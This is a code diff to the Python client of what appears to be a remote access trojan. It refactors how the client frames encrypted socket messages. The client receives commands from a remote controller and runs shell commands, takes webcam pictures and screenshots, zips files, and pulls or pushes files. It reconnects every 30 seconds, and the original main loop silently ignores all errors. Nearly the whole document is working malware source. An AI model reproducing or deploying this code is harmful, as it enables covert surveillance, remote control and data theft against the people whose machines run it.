@@ -22,34 +22,34 @@ class Client:
 
     def main(self):
         while not self.exit:
-            request = self.decode_request(self.connection.recv(self.connection.sock))
+            request = self.connection.recv(self.connection.sock)
             self.response["data"] = str()
             self.response["error"] = str()
 
             if request["cmd"] == "f":
                 process = multiprocessing.Process(target=self.cwd, args=(self.response, request["mode"], request["path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.encode_response(self.response), self.connection.sock)
+                self.connection.send(self.response, self.connection.sock)
             elif request["cmd"] == "c":
                 process = multiprocessing.Process(target=self.execute_command, args=(self.response, request["exe"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.encode_response(self.response), self.connection.sock)
+                self.connection.send(self.response, self.connection.sock)
             elif request["cmd"] == "z":
                 process = multiprocessing.Process(target=self.zip_file_or_folder, args=(self.response, request["comp_lvl"], request["open_path"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.encode_response(self.response), self.connection.sock)
+                self.connection.send(self.response, self.connection.sock)
             elif request["cmd"] == "w":
                 process = multiprocessing.Process(target=self.capture_camera_picture, args=(self.response, request["cam_port"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.encode_response(self.response), self.connection.sock)
+                self.connection.send(self.response, self.connection.sock)
             elif request["cmd"] == "s":
                 process = multiprocessing.Process(target=self.capture_screenshot, args=(self.response, request["monitor"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
-                self.connection.send(self.encode_response(self.response), self.connection.sock)
+                self.connection.send(self.response, self.connection.sock)
             elif request["cmd"] == "d":
                 self.download_file(request["open_path"])
             elif request["cmd"] == "u":
-                self.upload_file(request["save_path"])
+                self.upload_file(request["save_path"], request["data"])
             elif request["cmd"] == "r":
                 process = multiprocessing.Process(target=self.connection.sock.close)
                 self.handle_process(process, request["timeout"])
@@ -75,28 +75,24 @@ class Client:
             response["error"] = "UnicodeDecodeError"
 
     def download_file(self, path):
-        response = {"length": str(), "error": str()}
+        response = {"data": str(), "error": str()}
         try:
             with open(path, "rb") as file:
-                data = base64.b64encode(file.read()) + self.connection.END_MARKER
+                response["data"] = base64.b64encode(file.read()).decode(self.connection.CODEC)
         except FileNotFoundError:
             response["error"] = "FileNotFoundError"
         except PermissionError:
             response["error"] = "PermissionError"
-        else:
-            response["length"] = str(len(data))
-            self.connection.send(self.encode_response(response), self.connection.sock)
-            self.connection.sock.send(data)
+        self.connection.send(response, self.connection.sock)
 
-    def upload_file(self, path):
+    def upload_file(self, path, data):
         response = {"error": str()}
-        data = self.connection.recv(self.connection.sock)
         try:
             with open(path, "wb") as file:
-                file.write(data)
+                file.write(base64.b64decode(data))
         except PermissionError:
             response["error"] = "PermissionError"
-        self.connection.send(self.encode_response(response), self.connection.sock)
+        self.connection.send(response, self.connection.sock)
 
     def capture_screenshot(self, response, monitor, path):
         try:
@@ -146,12 +142,6 @@ class Client:
             self.response["data"] = ""
             self.response["error"] = "TimeoutExpired"
 
-    def decode_request(self, request):
-        return json.loads(request.decode(self.connection.CODEC))
-
-    def encode_response(self, response):
-        return json.dumps(response.copy()).encode(self.connection.CODEC)
-
 
 class Connection:
     def __init__(self):
@@ -182,15 +172,17 @@ class Connection:
             except socket.error:
                 time.sleep(30)
 
-    def send(self, data, connection):
-        data = base64.b64encode(self.encrypt(data)) + self.END_MARKER
+    def send(self, data: dict, connection):
+        data = base64.b64encode(self.encrypt(json.dumps(data.copy()).encode(self.CODEC))) + self.END_MARKER
+        header = base64.b64encode(self.encrypt(json.dumps({"length": len(data)}.copy()).encode(self.CODEC))) + self.END_MARKER
+        connection.send(header)
         connection.send(data)
 
-    def recv(self, connection):
+    def recv(self, connection) -> dict:
         data = bytearray()
         while not data.endswith(self.END_MARKER):
             data.extend(connection.recv(self.PACKET_SIZE))
-        return self.decrypt(base64.b64decode(data[:-1]))
+        return json.loads(self.decrypt(base64.b64decode(data[:-1])))
 
     def encrypt(self, data):
         nonce = os.urandom(12)
@@ -201,11 +193,11 @@ class Connection:
 
 
 if __name__ == "__main__":
-    while True:
-        try:
+    #while True:
+    #    try:
             client = Client()
             client.main()
-            if client.exit:
-                break
-        except:
-            pass
+    #        if client.exit:
+    #            break
+    #    except:
+    #        pass
